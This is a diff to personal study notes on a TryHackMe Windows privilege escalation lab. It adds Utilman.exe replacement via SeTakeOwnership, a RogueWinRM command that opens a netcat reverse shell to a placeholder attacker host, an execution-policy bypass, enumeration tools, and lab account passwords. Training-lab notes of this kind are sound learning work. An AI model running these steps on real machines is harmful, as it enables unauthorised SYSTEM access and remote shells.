@@ -12,6 +12,10 @@ https://tryhackme.com/room/windowsprivesc20
 	- [[#Unquoted Service Paths]]
 	- [[#Service Permissions]]
 - [[#Abusing Dangerous Privileges]]
+	- [[#SeBackup / SeRestore]]
+	- [[#SeTakeOwnership]]
+	- [[#SeImpersonate / SeAssignPrimaryToken]]
+- [[#Vulnerable Software]]
 - 
 
 ___
@@ -219,8 +223,7 @@ Read/Write any file on system (allow users to perform backups without admin priv
 **User:** THMBackup
 **Password:** CopyMaster555
 
-1. Connect to VM over RDP
-`xfreerdp /v:TARGET_IP /u:USERNAME`
+1. Connect to VM over RDP: `xfreerdp /v:TARGET_IP /u:USERNAME`
 
 2. Execute cmd as admin
 
@@ -250,18 +253,80 @@ Take ownership of any object
 **User:** THMTakeOwnership
 **Password:** TheWorldIsMine2022
 
+1. Connect to VM over RDP: `xfreerdp /v:TARGET_IP /u:USERNAME`
 
+2. Execute cmd as admin
 
-___
-### 
+3. Take ownership of executable that runs with SYSTEM privileges (here utilman.exe -- Ease of Access utility when screen is locked))
+`takeown /f C:\Windows\System32\Utilman.exe`
+
+4. `icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F`
+
+5. Replace utilman.exe with copy of cmd.exe: `copy cmd.exe utilman.exe`
+
+6. Lock screen (`rundll32.exe user32.dll,LockWorkStation`) and click on Ease of Access button (runs utilman)
+
+#### SeImpersonate / SeAssignPrimaryToken
 [[#Table of contents|Back to the top]]
 
+Impersonate other users and act on their behalf
 
+*Example:* FTP server has to impersonate user in ordre to use their access token to access their files
+
+LOCAL SERVICE and NETWORK SERVICE ACCOUNTS have SeImpersonate privilege, IIS create similar default account (`iis apppool\defaultapppool`)
+
+1. Spawn process users can connect to and authenticate
+2. Force privileged users to connect and authenticate to it
+
+**RogueWinRM** exploit can accomplish this
+
+In the example, we managed to compromise a website running on IIS and planted a webshell at http://10.82.168.162/
+
+Exploit has been uploaded at `C:\tools\`
+
+Set up listener
+
+Run exploit
+```Powershell
+c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP ATTACKER_PORT"
+```
 
 ___
-### 
+### Vulnerable Software
 [[#Table of contents|Back to the top]]
 
+#### Unpatched Software
+`wmic product get name,version,vendor`
+*might not list every program --> check Desktop shortcuts, available services, any trace indicating existence of additional software*
 
+Search for existing exploits (exploit-db)
+
+Powershell script extension: `.ps1`
+
+___
+### Other Tools
+[[#Table of contents|Back to the top]]
+
+**WinPEAS**
+Enumerate target system, uncover privilege escalation paths
+`winpeas.exe > outputfile.txt`
+[Download](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
+
+**PrivescCheck**
+Powershell script, searches for common privilege escalation
+`Set-ExecutionPolicy Bypass -Scope process -Force`
+`. .\PrivescCheck.ps1`
+`Invoke-ProvescCheck`
+[Download](https://github.com/itm4n/PrivescCheck)
+
+**WES-NG -- Windows Exploit Suggester - Next Generation**
+Runs on attacking machine (doesn't require to upload to target machine, making noise)
+`wes.py --update` 
+`systeminfo` (on target system)
+`wes.py systeminfo.txt`
+[Download](https://github.com/bitsadmin/wesng)
+
+**Metasploit**
+Meterpreter on target system --> use `multi/recon/local_exploit_suggester`
 
 ___
